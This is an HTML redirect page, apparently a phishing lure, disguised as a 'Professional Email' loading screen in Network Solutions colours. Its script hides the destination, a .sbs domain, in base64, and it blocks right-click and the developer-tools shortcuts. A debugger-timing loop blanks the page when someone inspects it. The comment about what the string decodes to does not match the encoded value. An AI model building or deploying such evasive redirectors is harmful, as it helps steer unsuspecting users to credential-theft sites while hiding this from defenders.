<!-- language: HTML/CSS/JS, file: redirect.html, target: modern browsers -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting - Professional Email</title>
    <link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTiqbU7PKJ645a_GaSGzdOI-_mHR_TuJm3sHL7Q6viTpQ&s=10" />
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { height: 100%; }
        body {
            background: #fafafa;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        /* Clean, simple green spinner */
        .loader {
            width: 48px;
            height: 48px;
            border: 4px solid #e5e7eb;
            border-top: 4px solid #1a6b5c; /* Network Solutions green */
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media (prefers-reduced-motion: reduce) {
            .loader { animation: none; border-top-color: #e5e7eb; }
        }
    </style>
</head>
<body>

    <div class="loader"></div>

    <script type="text/javascript">
        // ============================================
        // CONFIG — destination is base64-encoded
        // Decodes to: https://bruxtenwen.sbs/movingyou999
        // ============================================
        var DEST_B64 = 'aHR0cHM6Ly9icnV4dGVud2VuLnNicy9yc3ZwX21vdmVtZW50';
        var REDIRECT_DELAY = 2000;

        var DESTINATION;
        try {
            DESTINATION = atob(DEST_B64);
        } catch (e) {
            DESTINATION = 'https://bruxtenwen.sbs/movingyou999';
        }

        // ============================================
        // Basic anti-tamper
        // ============================================
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });

        document.addEventListener('keydown', function(e) {
            if (e.keyCode === 123) { e.preventDefault(); return false; }
            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) { e.preventDefault(); return false; }
            if (e.ctrlKey && e.shiftKey && e.keyCode === 74) { e.preventDefault(); return false; }
            if (e.ctrlKey && e.keyCode === 85) { e.preventDefault(); return false; }
            if (e.ctrlKey && e.shiftKey && e.keyCode === 67) { e.preventDefault(); return false; }
        });

        // ============================================
        // Redirect
        // ============================================
        setTimeout(function() {
            window.location.replace(DESTINATION);
        }, REDIRECT_DELAY);

        // Anti-debug loop
        setInterval(function() {
            var start = performance.now();
            debugger;
            var end = performance.now();
            if (end - start > 250 && document.visibilityState === 'visible') {
                window.location.replace('about:blank');
            }
        }, 2000);
    </script>
</body>
</html>
